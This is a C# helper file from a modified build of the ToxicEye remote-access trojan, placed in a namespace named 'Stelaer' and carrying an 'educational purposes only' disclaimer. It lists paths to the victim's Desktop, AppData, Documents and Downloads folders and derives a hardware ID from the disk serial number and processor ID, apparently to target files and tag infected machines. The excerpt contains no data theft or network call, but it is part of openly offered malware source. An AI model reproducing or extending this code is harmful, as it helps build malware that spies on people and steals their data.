/* 
       ^ Author    : LimerBoy && c0z3dc0
       ^ Name      : ToxicEye-RAT Modded
       ^ Github    : https://github.com/LimerBoy && https://github.com/c0z3dc0

       > This program is distributed for educational purposes only.
*/



using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;

namespace Stelaer
{
    class Help
    {
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // Help.DesktopPath
        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); //  Help.LocalData
        public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System); // Help.System
        public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // Help.AppDate
        public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData); // Help.CommonData
        public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); // Help.MyDocuments
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); // Help.UserProfile
        public static readonly string downloadsDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads"; // Help.downloadsDir
        public static string HWID = GetProcessorID() + GetHwid();
        public static string GetHwid()
        {
            string hwid = "";
            try
            {
                string drive = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
                ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + drive + ":\"");
                disk.Get();
                string diskLetter = (disk["VolumeSerialNumber"].ToString());
                hwid = diskLetter;
            }
            catch
            { }
            return hwid;
        }
        public static string GetProcessorID()
        {
            int a = 0;
            string sProcessorID = "";
            string sQuery = "SELECT ProcessorId FROM Win32_Processor";
            ManagementObjectSearcher oManagementObjectSearcher = new ManagementObjectSearcher(sQuery);
            ManagementObjectCollection oCollection = oManagementObjectSearcher.Get();
            foreach (ManagementObject oManagementObject in oCollection)
            {
                sProcessorID = (string)oManagementObject["ProcessorId"];
            }
                return (sProcessorID);

        }

    }
}
